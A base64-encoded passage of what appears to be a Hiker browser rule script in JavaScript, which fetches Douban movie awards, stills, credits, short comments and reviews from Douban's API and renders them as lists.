mh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcIiArIHR5cGUgKyBcXFwiL1xcXCIgKyBpZCArIFxcXCIvYXdhcmRzP3N0YXJ0PVxcXCIgKyAyMCAqIChwYWdlIC0gMSkgKyBcXFwiJmNvdW50PTIwXFxcIik7XFxyXFxuICAgIHIgKz0gXFxcIjxoMj7ojrflpZborrDlvZVcXFwiICsgJzxzbWFsbD48Zm9udCBjb2xvcj1cXFwiZ3JleVxcXCI+JyArIChzLnRvdGFsICE9IDAgPyAnKOWFsScgKyBzLnRvdGFsICsgJ+mhuSknIDogJyjmmoLml6ApJykgKyAnPC9mb250Pjwvc21hbGw+JyArIFxcXCI8L2gyPlxcXCI7XFxyXFxuICAgIC8vciArPSAnPGZvbnQgY29sb3I9XFxcImdyZXlcXFwiPicgKyAocy50b3RhbCAhPSAwID8gJ+WFsScgKyBzLnRvdGFsICsgJ+mhuScgOiAn5pqC5pegJykgKyAnPC9mb250Pjxici8+JztcXHJcXG4gICAgbGV0IHIyID0gJyc7XFxyXFxuICAgIHMuYXdhcmRzLmZvckVhY2goZSA9PiB7XFxyXFxuICAgICAgICByMiArPSAoZS5jZXJlbW9ueS50aXRsZSArICcoJyArIGUuY2VyZW1vbnkueWVhciArICcpJykuYmlnKCkuYm9sZCgpICsgJzxzbWFsbD4oPGEgaHJlZj1cXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjQHJ1bGU9anM6ZXZhbChKU09OLnBhcnNlKGZldGNoKGBoaWtlcjovL3BhZ2UvbWFpbmApKS5ydWxlKTthd2FyZFZpZXcoYCcgKyBlLmNlcmVtb255LmlkICsgJ2AsYCcgKyBlLmNlcmVtb255LnRpdGxlICsgJ2ApO1xcXCI+5p+l55yL6K+m5oOFPC9hPik8L3NtYWxsPicgKyAnPGJyLz4nO1xcclxcbiAgICAgICAgZS5jYXRlZ29yaWVzLmZvckVhY2goaXRlbSA9PiB7XFxyXFxuICAgICAgICAgICAgcjIgKz0gKGl0ZW0uY2F0ZWdvcnkudGl0bGUgKyAoaXRlbS5pc193b24gPyAnJyA6ICco5o+Q5ZCNKScpICsgJyZuYnNwOycpLmZvbnRjb2xvcihcXFwiZ3JleVxcXCIpO1xcclxcbiAgICAgICAgICAgIHIyICs9IGl0ZW0uY2VsZWJyaXRpZXMubWFwKGNlbGVicml0eSA9PiBjZWxlYnJpdHkubmFtZSkuam9pbignJm5ic3A7LyZuYnNwOycpO1xcclxcbiAgICAgICAgICAgIHIyICs9ICc8YnIvPic7XFxyXFxuICAgICAgICB9KVxcclxcbiAgICAgICAgcjIgKz0gJzxici8+JztcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgaWYgKHBhZ2UgPT0gMSkge1xcclxcbiAgICAgICAgc2V0SG9tZVJlc3VsdCh7XFxyXFxuICAgICAgICAgICAgZGF0YTogW3tcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHIgKyByMixcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICAgICAgfV1cXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH0gZWxzZSBpZihzLmF3YXJkcy5sZW5ndGggPT0gMCl7XFxyXFxuICAgICAgICBzZXRSZXN1bHQoW10pO1xcclxcbiAgICB9IGVsc2V7XFxyXFxuICAgICAgICBzZXRIb21lUmVzdWx0KHtcXHJcXG4gICAgICAgICAgICBkYXRhOiBbe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogcjIsXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcclxcbiAgICAgICAgICAgIH1dXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxufVxcclxcblxcclxcbi8v5aWW6aG56K+m5oOF6aG16Z2iXFxyXFxuZnVuY3Rpb24gYXdhcmRWaWV3KGlkLCBuYW1lKSB7XFxyXFxuICAgIHNldFBhZ2VUaXRsZShuYW1lKTtcXHJcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvY2VyZW1vbnkvXFxcIiArIGlkKTtcXHJcXG4gICAgbGV0IGEgPSBbXTtcXHJcXG4gICAgYS5wdXNoKHtcXHJcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIChzLnRpdGxlICsgJygnICsgcy55ZWFyICsgJyknKS5iaWcoKS5ib2xkKCksXFxyXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxyXFxuICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcclxcbiAgICAgICAgfVxcclxcbiAgICB9KVxcclxcbiAgICBzLnBsYXlsaXN0cy5mb3JFYWNoKGUgPT4ge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogZS50aXRsZSxcXHJcXG4gICAgICAgICAgICBkZXNjOiAn5YWxJyArIGUuaXRlbXNfY291bnQgKyAn6YOoJyxcXHJcXG4gICAgICAgICAgICBpbWc6IGUuY292ZXJfdXJsICsgJ0BSZWZlcmVyPScgKyBlLmNvdmVyX3VybCxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9IaXN0b3J5IycpLnJ1bGUoKGlkKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgZG91TGlzdChpZCk7XFxyXFxuICAgICAgICAgICAgfSwgZS5pZClcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH0pXFxyXFxuXFxyXFxuICAgIGxldCByID0gJyc7XFxyXFxuICAgIHMucHJpemVzLmZvckVhY2goZSA9PiB7XFxyXFxuICAgICAgICByICs9ICc8aDQ+6I635aWW5ZCN5Y2VKCcgKyBlLnRpdGxlICsgJyk8L2g0Pic7XFxyXFxuICAgICAgICBlLmNhdGVnb3JpZXMuZm9yRWFjaCh0ID0+IHtcXHJcXG4gICAgICAgICAgICByICs9ICh0LnRpdGxlICsgJyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOycpLmZvbnRjb2xvcihcXFwiZ3JleVxcXCIpLmJvbGQoKTtcXHJcXG4gICAgICAgICAgICByICs9IHQucmVzdWx0cy5tYXAoaXRlbSA9PiAhIWl0ZW0uaW5mbyA/IGl0ZW0uaW5mbyArICgnJm5ic3A7LSZuYnNwOycgKyBpdGVtLnRpdGxlICsgJyZuYnNwOyZuYnNwOycpLmZvbnRjb2xvcihcXFwiZ3JleVxcXCIpIDogaXRlbS50aXRsZSkuam9pbignJm5ic3A7LyZuYnNwOycpLmJvbGQoKTtcXHJcXG4gICAgICAgICAgICByICs9ICc8YnIvPic7XFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9KVxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6IHIsXFxyXFxuICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IGkgPSBbXTtcXHJcXG4gICAgcy5jZXJlbW9uaWVzLmZvckVhY2goZSA9PiB7XFxyXFxuICAgICAgICBpLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiBlLnRpdGxlLFxcclxcbiAgICAgICAgICAgIGRlc2M6IGUueWVhciArICflubQnLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnbW92aWVfMycsXFxyXFxuICAgICAgICAgICAgaW1nOiBlLnBpYy5ub3JtYWwgKyAnQFJlZmVyZXI9JyArIGUucGljLm5vcm1hbCxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9IaXN0b3J5IycpLnJ1bGUoKGlkLCBuYW1lKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgYXdhcmRWaWV3KGlkLCBuYW1lKTtcXHJcXG4gICAgICAgICAgICB9LCBlLmlkLCBlLnRpdGxlKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSlcXHJcXG4gICAgaWYgKGkubGVuZ3RoID4gMCkge1xcclxcbiAgICAgICAgaS51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn5Y6G5bGK5Zue6aG+Jy5iaWcoKS5ib2xkKCksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzEnLFxcclxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxyXFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgc2V0UmVzdWx0KGEuY29uY2F0KGkpKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/liafnhafpobXpnaJcXHJcXG5mdW5jdGlvbiBzdGlsbHNMaXN0KHR5cGUsIGlkKSB7XFxyXFxuICAgIGFkZExpc3RlbmVyKCdvbkNsb3NlJywgJ2NsZWFyTXlWYXIoXFxcInBob3RvXFxcIiknKTtcXHJcXG4gICAgbGV0IHBhZ2UgPSBNWV9QQUdFO1xcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDliafnhac6ICdwaG90b3MnLFxcclxcbiAgICAgICAg5rW35oqlOiAnY292ZXJzJ1xcclxcbiAgICB9O1xcclxcbiAgICBsZXQgYSA9IFtdO1xcclxcbiAgICBsZXQgdGVtcCA9IGdldE15VmFyKCdwaG90bycsICdwaG90b3MnKTtcXHJcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcclxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wID09IGl0ZW1zW2ldID8gJ+KAnOKAnOKAneKAnScgKyBpLmZvbnRjb2xvcihjb2xvcikgOiBpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5JykubGF6eVJ1bGUoKHQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3Bob3RvJywgdCk7XFxyXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSc7XFxyXFxuICAgICAgICAgICAgfSwgaXRlbXNbaV0pXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCByID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0eXBlICsgXFxcIi9cXFwiICsgaWQgKyBcXFwiL1xcXCIgKyB0ZW1wICsgXFxcIj9zdGFydD1cXFwiICsgMzAgKiAocGFnZSAtIDEpICsgXFxcIiZjb3VudD0zMFxcXCIpO1xcclxcbiAgICBsZXQgbCA9IHIucGhvdG9zLm1hcCgoZSA9PiAoe1xcclxcbiAgICAgICAgdGl0bGU6IGUuY3JlYXRlX3RpbWUsXFxyXFxuICAgICAgICBpbWc6IGUuaW1hZ2Uuc21hbGwudXJsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLmltYWdlLnNtYWxsLnVybCxcXHJcXG4gICAgICAgIHVybDogZS5pbWFnZS5sYXJnZS51cmwgKyBcXFwiP3R5cGU9LmpwZ0BSZWZlcmVyPVxcXCIgKyBlLmltYWdlLmxhcmdlLnVybCArIFxcXCI/dHlwZT0uanBnXFxcIixcXHJcXG4gICAgICAgIGNvbF90eXBlOiBcXFwicGljXzJcXFwiXFxyXFxuICAgIH0pKSk7XFxyXFxuXFxyXFxuICAgIGlmIChwYWdlID09IDEpIHtcXHJcXG4gICAgICAgIGwudW5zaGlmdCh7XFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXHJcXG4gICAgICAgIH0pO1xcclxcbiAgICAgICAgaWYgKHRlbXAgPT0gJ3Bob3RvcycpIHtcXHJcXG4gICAgICAgICAgICBsLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIjxiaWc+5YWxPHN0cm9uZz4gXFxcIiArIHIudG90YWwgKyAnIDwvc3Ryb25nPuW8oOWJp+eFpzwvYmlnPjxici8+PHNtYWxsPjxmb250IGNvbG9yPVxcXCJncmV5XFxcIj7lrpjmlrnliafnhafvvJonICsgci5vICsgXFxcIuW8oCZuYnNwO+aIquWbvu+8mlxcXCIgKyByLmMgKyBcXFwi5bygJm5ic3A75bel5L2c54Wn77yaXFxcIiArIHIudyArIFxcXCLlvKAmbmJzcDvmlrDpl7vlm77niYfvvJpcXFwiICsgci5uICsgXFxcIuW8oCZuYnNwO+eyieS4neWbvueJh++8mlxcXCIgKyByLmYgKyBcXFwi5bygPC9mb250Pjwvc21hbGw+XFxcIixcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgbC51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCI8YmlnPuWFsTxzdHJvbmc+IFxcXCIgKyByLnRvdGFsICsgXFxcIjwvc3Ryb25nPuW8oOa1t+aKpTwvYmlnPlxcXCIsXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICBsID0gYS5jb25jYXQobCk7XFxyXFxuICAgIH1cXHJcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxyXFxuICAgICAgICBkYXRhOiBsXFxyXFxuICAgIH0pXFxyXFxufVxcclxcblxcclxcbi8v5ryU6IGM5Lq65ZGY6aG16Z2iXFxyXFxuZnVuY3Rpb24gY3JlZGl0cyh0eXBlLCBpZCkge1xcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdHlwZSArIFxcXCIvXFxcIiArIGlkICsgXFxcIi9jcmVkaXRzXFxcIik7XFxyXFxuICAgIGxldCByID0gW107XFxyXFxuICAgIGkuY3JlZGl0cy5mb3JFYWNoKChlID0+IHtcXHJcXG4gICAgICAgIHIucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgICAgIGUuY2VsZWJyaXRpZXMuZm9yRWFjaCgoZSA9PiB7XFxyXFxuICAgICAgICAgICAgci5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGUubmFtZSArIFxcXCJcXFxcblxcXCIgKyBlLmxhdGluX25hbWUsXFxyXFxuICAgICAgICAgICAgICAgIGRlc2M6IGUuY2hhcmFjdGVyLFxcclxcbiAgICAgICAgICAgICAgICBpbWc6IGUuYXZhdGFyLm5vcm1hbCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5hdmF0YXIubm9ybWFsLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfdmVydGljYWxfcGljJyxcXHJcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjJykucnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgZWxlc3NhclZpZXcoZS51cmkuc3BsaXQoXFxcInN1YmplY3RfaWQ9XFxcIilbMV0sIGUuaWQsIGUubmFtZSk7XFxyXFxuICAgICAgICAgICAgICAgIH0sIGUpXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH0pKVxcclxcbiAgICB9KSk7XFxyXFxuICAgIHNldEhvbWVSZXN1bHQoe1xcclxcbiAgICAgICAgZGF0YTogclxcclxcbiAgICB9KVxcclxcbn1cXHJcXG5cXHJcXG4vL+efreivhOmhtemdolxcclxcbmZ1bmN0aW9uIHNob3J0Q29tbWVudExpc3QodHlwZSwgaWQpIHtcXHJcXG4gICAgYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCBcXFwiY2xlYXJNeVZhcignc2hvcnRjb21tZW50JylcXFwiKTtcXHJcXG4gICAgbGV0IGl0ZW1zID0ge1xcclxcbiAgICAgICAg54Ot6ZeoOiAnaG90JyxcXHJcXG4gICAgICAgIOacgOaWsDogJ2xhdGVzdCdcXHJcXG4gICAgfVxcclxcbiAgICBsZXQgdSA9IGdldE15VmFyKCdzaG9ydGNvbW1lbnQnLCAnaG90Jyk7XFxyXFxuICAgIGxldCBhID0gW107XFxyXFxuICAgIGxldCBjaG9vc2VDb2xvciA9IGdldENvbmZpZygnY2hvb3NlQ29sb3InKSAvLyB8fCBcXFwiI0ZBNzI5OFxcXCI7XFxyXFxuICAgIGZvciAoaSBpbiBpdGVtcykge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdSA9PT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjaG9vc2VDb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5JykubGF6eVJ1bGUoKHQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcInNob3J0Y29tbWVudFxcXCIsIHQpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSwgaXRlbXNbaV0pXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCBwYWdlID0gTVlfUEFHRTtcXHJcXG4gICAgbGV0IHIgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcIiArIHR5cGUgKyBcXFwiL1xcXCIgKyBpZCArIFxcXCIvaW50ZXJlc3RzP3N0YXJ0PVxcXCIgKyAzMCAqIChwYWdlIC0gMSkgKyBcXFwiJmNvdW50PTMwJm9yZGVyX2J5PVxcXCIgKyB1KTtcXHJcXG4gICAgbGV0IGwgPSBbXTtcXHJcXG4gICAgbGV0IHN0YXJDb2xvciA9IGdldENvbmZpZygnc3RhckNvbG9yJyk7XFxyXFxuICAgIHIuaW50ZXJlc3RzLmZvckVhY2goKGUgPT4ge1xcclxcbiAgICAgICAgbGV0IHQgPSBcXFwiXFxcIjtcXHJcXG4gICAgICAgIGlmIChlLnJhdGluZykge1xcclxcbiAgICAgICAgICAgIHQgPSBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgbC5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogZS51c2VyLm5hbWUsXFxyXFxuICAgICAgICAgICAgaW1nOiBlLnVzZXIuYXZhdGFyLFxcclxcbiAgICAgICAgICAgIHVybDogZS51c2VyLnVybCxcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImF2YXRhclxcXCJcXHJcXG4gICAgICAgIH0pO1xcclxcbiAgICAgICAgbC5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogZS5jb21tZW50ICsgKHQgPyAnPGJyLz48c21hbGw+55yL6L+HIDxmb250IGNvbG9yPScgKyBzdGFyQ29sb3IgKyAnPicgKyB0ICsgXFxcIjwvZm9udD48L3NtYWxsPlxcXCIgOiBcXFwiXFxcIikgKyAnPGJyLz48c21hbGw+PGZvbnQgY29sb3I9XFxcImdyZXlcXFwiPicgKyBlLnZvdGVfY291bnQgKyBcXFwi6LWe4oCiXFxcIiArIC9cXFxcZHs0fS1cXFxcZHsxLDJ9LVxcXFxkezEsMn0vZy5leGVjKGUuY3JlYXRlX3RpbWUpICsgXFxcIjwvZm9udD48L3NtYWxsPlxcXCIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgICAgIGwucHVzaCh7XFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSkpO1xcclxcblxcclxcbiAgICBpZiAocGFnZSA9PSAxKSB7XFxyXFxuICAgICAgICBsLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgICAgIGwudW5zaGlmdCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCI8YmlnPuWFsTxzdHJvbmc+IFxcXCIgKyByLnRvdGFsICsgXFxcIiA8L3N0cm9uZz7mnaHnn63or4Q8L2JpZz5cXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcclxcbiAgICAgICAgfSk7XFxyXFxuICAgICAgICBzZXRIb21lUmVzdWx0KHtcXHJcXG4gICAgICAgICAgICBkYXRhOiBhLmNvbmNhdChsKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSBlbHNlIHtcXHJcXG4gICAgICAgIHNldEhvbWVSZXN1bHQoe1xcclxcbiAgICAgICAgICAgIGRhdGE6IGxcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG59XFxyXFxuXFxyXFxuLy/liafor4TpobXpnaJcXHJcXG5mdW5jdGlvbiBkcmFtYVJldmlld0xpc3QodHlwZSwgaWQpIHtcXHJcXG4gICAgYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCBcXFwiY2xlYXJNeVZhcignZHJhbWFyZXZpZXcnKVxcXCIpO1xcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDng63pl6g6ICdob3QnLFxcclxcbiAgICAgICAg5pyA5pawOiAnbGF0ZXN0J1xcclxcbiAgICB9XFxyXFxuICAgIGxldCB1ID0gZ2V0TXlWYXIoJ2RyYW1hcmV2aWV3JywgJ2hvdCcpO1xcclxcbiAgICBsZXQgYSA9IFtdO1xcclxcbiAgICBsZXQgY2hvb3NlQ29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxyXFxuICAgIGZvciAoaSBpbiBpdGVtcykge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdSA9PT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjaG9vc2VDb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5JykubGF6eVJ1bGUoKHQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImRyYW1hcmV2aWV3XFxcIiwgdCk7XFxyXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICB9LCBpdGVtc1tpXSlcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgbGV0IHBhZ2UgPSBNWV9QQUdFXFxyXFxuICAgIGxldCByID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0eXBlICsgXFxcIi9cXFwiICsgaWQgKyBcXFwiL3Jldmlld3M/c3RhcnQ9XFxcIiArIDE1ICogKHBhZ2UgLSAxKSArIFxcXCImY291bnQ9MTUmb3JkZXJfYnk9XFxcIiArIHUpO1xcclxcbiAgICBsZXQgbCA9IFtdO1xcclxcbiAgICBsZXQgc3RhckNvbG9yID0gZ2V0Q29uZmlnKCdzdGFyQ29sb3InKTtcXHJcXG4gICAgci5yZXZpZXdzLmZvckVhY2goKGUgPT4ge1xcclxcbiAgICAgICAgbGV0IHQgPSBcXFwiXFxcIjtcXHJcXG4gICAgICAgIGlmIChlLnJhdGluZykge1xcclxcbiAgICAgICAgICAgIHQgPSBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgbGV0IGkgPSBlLmNvbW1lbnRzX2NvdW50ID8gZS5jb21tZW50c19jb3VudCArIFxcXCLlm57lpI1cXFwiIDogXFxcIlxcXCIsXFxyXFxuICAgICAgICAgICAgciA9IGUudXNlZnVsX2NvdW50ID8gZS51c2VmdWxfY291bnQgKyBcXFwi5pyJ55SoXFxcIiA6IFxcXCJcXFwiLFxcclxcbiAgICAgICAgICAgIG8gPSBlLnJlc2hhcmVzX2NvdW50ID8gZS5yZXNoYXJlc19jb3VudCArIFxcXCLovazlj5FcXFwiIDogXFxcIlxcXCI7XFxyXFxuXFxyXFxuICAgICAgICByID0gaSAmJiByID8gXFxcIuKAolxcXCIgKyByIDogcjtcXHJcXG4gICAgICAgIG8gPSAoaSB8fCByKSAmJiBvID8gXFxcIuKAolxcXCIgKyBvIDogbztcXHJcXG4gICAgICAgIGwucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IGUudXNlci5uYW1lLFxcclxcbiAgICAgICAgICAgIGltZzogZS51c2VyLmF2YXRhcixcXHJcXG4gICAgICAgICAgICB1cmw6IGUudXNlci51cmwsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJhdmF0YXJcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICAgICAgbC5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIjxzdHJvbmc+XFxcIiArIGUudGl0bGUgKyBcXFwiPC9zdHJvbmc+PGJyLz5cXFwiICsgZS5hYnN0cmFjdCArICcgICA8c21hbGw+KDxhIGhyZWY9XFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5I0BydWxlPWpzOmV2YWwoSlNPTi5wYXJzZShmZXRjaChgaGlrZXI6Ly9wYWdlL21haW5gKSkucnVsZSk7ZHJhbWFSZXZpZXdWaWV3KCcgKyBlLmlkICsgJylcXFwiPuabtOWkmjwvYT4pPC9zbWFsbD4nICsgKHQgPyAnPGJyLz48c21hbGw+55yL6L+HIDxmb250IGNvbG9yPScgKyBzdGFyQ29sb3IgKyAnPicgKyB0ICsgXFxcIjwvZm9udD48L3NtYWxsPlxcXCIgOiBcXFwiXFxcIikgKyAnPGJyLz48c21hbGw+PGZvbnQgY29sb3I9XFxcImdyZXlcXFwiPicgKyBpICsgciArIG8gKyBcXFwiPC9mb250Pjwvc21hbGw+XFxcIixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgICAgICBsLnB1c2goe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH0pKTtcXHJcXG5cXHJcXG4gICAgaWYgKHBhZ2UgPT0gMSkge1xcclxcbiAgICAgICAgbC51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSk7XFxyXFxuICAgICAgICBsLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwiPGJpZz7lhbE8c3Ryb25nPiBcXFwiICsgci50b3RhbCArIFxcXCIgPC9zdHJvbmc+5p2h5Ymn6K+EPC9iaWc+XFxcIixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4d